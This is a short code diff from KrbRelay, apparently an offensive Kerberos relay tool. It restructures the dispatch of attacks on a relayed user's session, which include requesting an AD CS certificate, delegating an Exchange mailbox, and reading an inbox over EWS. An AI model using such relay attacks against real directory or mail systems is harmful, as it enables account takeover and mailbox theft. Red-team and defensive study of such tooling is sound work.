@@ -72,20 +72,24 @@ namespace KrbRelay.Clients
                         Attacks.Http.ProxyServer.Start(httpClient, httpClient.BaseAddress.ToString());
                     }
 
-                    if (attacks.Keys.Contains("adcs"))
+                    else if (attacks.Keys.Contains("adcs"))
                     {
                         //Console.WriteLine("Relayed user:{0}{1}", relayedUser, relayedUserDomain);
                         Attacks.Http.ADCS.requestCertificate(httpClient, relayedUser, relayedUserDomain, attacks["adcs"]);
                     }
 
-                    if (attacks.Keys.Contains("ews-delegate"))
+                    else if (attacks.Keys.Contains("ews-delegate"))
                     {
                         Attacks.Http.EWS.delegateMailbox(httpClient, relayedUser, attacks["ews-delegate"]);
                     }
 
-                    if (attacks.Keys.Contains("ews-search"))
+                    else if (attacks.Keys.Contains("ews-search"))
                     {
                         Attacks.Http.EWS.readMailbox(httpClient, "inbox", attacks["ews-search"]);
+                    }
+                    else
+                    {
+                        Console.WriteLine(result.Content.ReadAsStringAsync().Result);
                     }
                 }
                 catch (Exception e)
